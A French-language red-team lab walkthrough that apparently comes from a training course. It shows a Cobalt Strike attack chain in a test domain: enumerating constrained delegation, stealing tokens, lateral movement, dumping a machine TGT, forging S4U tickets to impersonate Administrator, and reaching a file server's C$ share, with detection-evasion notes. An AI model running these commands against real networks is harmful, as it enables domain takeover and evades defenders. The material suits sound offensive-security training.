# Lab — Constrained Delegation avec Protocol Transition

>L’objectif est d’exploiter la **Constrained Delegation** avec **Protocol Transition** pour accéder à un service back-end.

## Énumération

1. Lancer Cobalt Strike et se connecter au team server.

```cs
sleep 5 5
ps
ppid 12832
spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
getuid
```

2. Rechercher les ordinateurs dont l’attribut `msDS-AllowedToDelegateTo` n’est pas vide.
  
```Beacon-nocolor
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

⚠️ Le résultat attendu est `lon-ws-1$`, autorisé à effectuer une delegation vers `cifs/lon-fs-1`.

3. Vérifier avec PowerShell que le flag **TRUSTED_TO_AUTH_FOR_DELEGATION** est actif.

```Terminal-nocolor
[Convert]::ToBoolean(16781312 -band 16777216)
```

⚠️ Le résultat attendu est `True`.

4. Effectuer un **Lateral Movement** vers `lon-ws-1`. Un Beacon SYSTEM y est nécessaire pour récupérer le TGT du compte machine.

> **Pourquoi SYSTEM sur lon-ws-1 ?** La phase suivante nécessite le TGT du compte machine `lon-ws-1$` (LUID `0x3e7`). Seul SYSTEM peut lire cette session Kerberos ; un Beacon utilisateur ne suffit pas.

## Impersonation de rsteel sur lon-ws-1

```cs
ps                              // find rsteel process — look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
steal_token <rsteel-cmd-pid>        // OPSEC-🟢SAFE — token dup in-process, no Event 4648
```

## Jump vers lon-ws-1 

```cs
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-ws-1 smb
```

## Obtenir SYSTEM sur le Beacon lon-ws-1

Le nouveau Beacon s’exécute sous `CONTOSO\rsteel`. Il faut obtenir SYSTEM pour lire le TGT du compte machine `lon-ws-1$` :

```cs
// New beacon on lon-ws-1:
beacon> getuid                                  // confirm rsteel context
beacon> steal_token <SYSTEM-pid>               // steal token from any SYSTEM process (e.g. svchost.exe)
beacon> getuid                                  // confirm NT AUTHORITY\SYSTEM
```


## Exploitation

1. Récupérer le TGT de `lon-ws-1` et repérer le LUID hexadécimal `0x3e7`  

```Beacon-nocolor
sleep 5 5
ps
ppid 844
spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
getuid

krb_triage
krb_dump /luid:3e7 /service:krbtgt


krb_s4u /ticket:[base64_output_direct_fromkrb_dump_TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator

krb_describe /ticket:[base64_output_direct_fromkrb_dump_TGT]
```

3. Utiliser le ticket S4U pour accéder au partage `C$` de `lon-fs-1` en tant qu’Administrator.

> Le ticket S4U cible `cifs/lon-fs-1` et permet l’impersonation d’`Administrator`. L’injecter dans une session de logon dédiée pour accéder au partage sans connaître le mot de passe.

```cs
// Step 1 — Create sacrificial logon session (OPSEC-🟠CAUTION — Event 4648)
beacon> make_token CONTOSO\Administrator FakePass!
// Password is irrelevant — the S4U ticket provides the actual Kerberos auth

// Step 2 — Save the S4U ticket kirbi to attacker desktop (run in attacker PowerShell, NOT beacon)
```

Depuis PowerShell sur l’Attacker Desktop (hors Beacon pour éviter un child process) :

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64 TICKET from krb_s4u output]"))
```

> De retour dans le Beacon :  

```cs
// Step 3 — Inject S4U ticket into the logon session (OPSEC-🟠CAUTION)
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi

// Step 4 — Verify access (OPSEC-🟢SAFE — built-in beacon command, no child process)
beacon> ls \\lon-fs-1\c$

//jump 
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-fs-1 smb
```

## Nouveau Beacon sur lon-fs-1

```cs
ls c:\
powerpick [System.IO.File]::WriteAllText("C:\rto.txt","liham")
powerpick gc C:\rto.txt
```

⚠️ Ce lab montre l’exploitation de la Constrained Delegation avec Protocol Transition pour effectuer une impersonation vers le service délégué.
